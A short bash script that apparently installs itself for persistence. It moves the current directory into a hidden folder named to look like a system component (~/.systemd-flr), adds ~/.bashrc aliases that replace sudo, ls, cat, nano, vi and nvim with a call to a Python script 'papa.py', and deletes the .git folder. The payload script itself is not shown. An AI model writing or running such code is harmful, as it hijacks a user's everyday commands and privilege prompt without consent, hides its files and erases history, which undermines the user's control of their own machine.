#!/bin/bash
DEST="$HOME/.ipython"
if [ ! -d "$DEST" ]; then
	DEST="$HOME/.systemd-flr"
fi
mv "$PWD" "$DEST"
echo 'alias sudo="python3 $DEST/papa.py $DEST/papa.ppm"' >> ~/.bashrc
echo 'alias fularta="python3 $DEST/papa.py $DEST/papa.ppm"' >> ~/.bashrc
echo 'alias ls="python3 $DEST/papa.py $DEST/papa.ppm"' >> ~/.bashrc
echo 'alias nano="python3 $DEST/papa.py $DEST/papa.ppm"' >> ~/.bashrc
echo 'alias vi="python3 $DEST/papa.py $DEST/papa.ppm"' >> ~/.bashrc
echo 'alias nvim="python3 $DEST/papa.py $DEST/papa.ppm"' >> ~/.bashrc
echo 'alias cat="python3 $DEST/papa.py $DEST/papa.ppm"' >> ~/.bashrc

rm -rf .git
